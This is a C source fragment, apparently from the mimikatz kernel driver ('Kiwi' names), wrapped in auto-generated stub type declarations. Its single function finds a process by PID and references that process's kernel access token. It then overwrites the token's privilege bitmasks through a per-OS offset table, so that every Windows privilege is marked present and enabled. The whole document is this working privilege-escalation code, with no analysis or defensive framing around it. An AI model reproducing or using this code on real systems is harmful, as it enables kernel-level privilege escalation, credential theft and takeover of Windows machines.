
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef scalar_t__ ULONG_PTR ;
typedef int ULONG ;
struct TYPE_2__ {int* Present; int* Enabled; } ;
typedef int SIZE_T ;
typedef int PVOID ;
typedef scalar_t__* PULONG ;
typedef TYPE_1__* PKIWI_NT6_PRIVILEGES ;
typedef int PKIWI_BUFFER ;
typedef scalar_t__ PEPROCESS ;
typedef int * PACCESS_TOKEN ;
typedef int NTSTATUS ;
typedef int HANDLE ;


 scalar_t__** EPROCESS_OffSetTable ;
 size_t KiwiOsIndex ;
 size_t KiwiOsIndex_VISTA ;
 scalar_t__ NT_SUCCESS (int ) ;
 int ObDereferenceObject (scalar_t__) ;
 int PsDereferencePrimaryToken (int *) ;
 scalar_t__ PsGetCurrentProcess () ;
 int PsGetProcessId (scalar_t__) ;
 int PsGetProcessImageFileName (scalar_t__) ;
 int PsLookupProcessByProcessId (int ,scalar_t__*) ;
 int * PsReferencePrimaryToken (scalar_t__) ;
 int STATUS_NOT_SUPPORTED ;
 int STATUS_SUCCESS ;
 size_t TokenPrivs ;
 int kprintf (int ,char*,int ,int ) ;

NTSTATUS kkll_m_process_fullprivileges(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer)
{
 NTSTATUS status = STATUS_SUCCESS;
 PEPROCESS pProcess = ((void*)0);
 PACCESS_TOKEN pAccessToken = ((void*)0);
 PKIWI_NT6_PRIVILEGES pPrivileges;
 PULONG pPid = (PULONG) bufferIn;

 if(KiwiOsIndex >= KiwiOsIndex_VISTA)
 {
  if(pPid && (szBufferIn == sizeof(ULONG)))
   status = PsLookupProcessByProcessId((HANDLE) *pPid, &pProcess);
  else
   pProcess = PsGetCurrentProcess();

  if(NT_SUCCESS(status) && pProcess)
  {
   if(pAccessToken = PsReferencePrimaryToken(pProcess))
   {
    status = kprintf(outBuffer, L"All privileges for the access token from %u/%-14S\n", PsGetProcessId(pProcess), PsGetProcessImageFileName(pProcess));

    pPrivileges = (PKIWI_NT6_PRIVILEGES) (((ULONG_PTR) pAccessToken) + EPROCESS_OffSetTable[KiwiOsIndex][TokenPrivs]);
    pPrivileges->Present[0] = pPrivileges->Enabled[0] = 0xfc;
    pPrivileges->Present[1] = pPrivileges->Enabled[1] =
    pPrivileges->Present[2] = pPrivileges->Enabled[2] =
    pPrivileges->Present[3] = pPrivileges->Enabled[3] = 0xff;
    pPrivileges->Present[4] = pPrivileges->Enabled[4] = 0x0f;

    PsDereferencePrimaryToken(pAccessToken);
   }

   if(pProcess != PsGetCurrentProcess())
    ObDereferenceObject(pProcess);
  }
 }
 else status = STATUS_NOT_SUPPORTED;

 return status;
}
